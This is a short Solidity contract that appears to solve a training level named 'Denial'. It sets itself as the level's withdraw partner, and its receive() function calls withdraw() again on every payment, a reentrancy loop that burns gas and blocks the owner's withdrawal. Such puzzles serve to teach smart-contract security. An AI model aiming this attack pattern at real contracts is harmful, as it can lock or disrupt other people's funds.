// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./level.sol";

contract Solution {
    Denial _level;

    constructor(address payable _levelInstance) public {
        _level = Denial(_levelInstance);
        _level.setWithdrawPartner(address(this));
    }

    receive() external payable {
        _level.withdraw();
    }
}
